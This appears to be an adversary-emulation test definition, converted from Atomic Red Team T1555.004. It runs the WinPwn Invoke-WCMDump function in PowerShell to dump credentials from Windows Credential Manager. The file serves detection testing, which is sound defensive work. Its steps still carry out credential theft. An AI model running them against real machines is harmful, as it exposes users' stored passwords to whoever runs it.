# Converted from Atomic Red Team - Credentials from Password Stores: Windows Credential Manager
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1555.004
# Original auto_generated_guid: fa714db1-63dd-479e-a58e-7b2b52ca5997

---
api_version: 2.0
uuid: 288d3e23-a769-4e15-ad25-646683a36480
name: WinPwn - Loot local Credentials - Invoke-WCMDump
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  Loot local Credentials - Invoke-WCMDump technique via function of WinPwn

mitre:
  tactics:
    - "TA0006 Credential Access"
  techniques:
    - "T1555 Credentials from Password Stores"
  subtechniques:
    - "T1555.004 Windows Credential Manager"

requirements:
  platforms:
    - os: windows
  superuser: false

args:
  - name: script_path
    description: Path to DumpWCM.ps1 script file
    type: path
    default: "./Invoke-WCMDump.ps1"

steps:
  - name: ensure_script_exists
    executor: powershell
    inline: |
      if (-not (Test-Path "{{.Args.script_path}}")) {
        Write-Error "DumpWCM script not found at {{.Args.script_path}}. Exiting..."
        exit 1
      }

  - name: invoke_wcm_dump
    executor: powershell
    inline: |
      . "{{.Args.script_path}}"
      Invoke-WCMDump
